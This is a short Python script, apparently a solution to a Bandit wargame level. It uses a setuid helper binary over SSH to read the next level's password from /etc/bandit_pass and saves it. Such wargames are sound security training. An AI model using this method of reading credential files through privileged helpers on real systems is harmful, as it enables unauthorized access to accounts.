from util import *

shell = open_ssh()
pwd = shell.system("./bandit20-do cat /etc/bandit_pass/bandit20").recvall().strip()

write(password(), pwd)
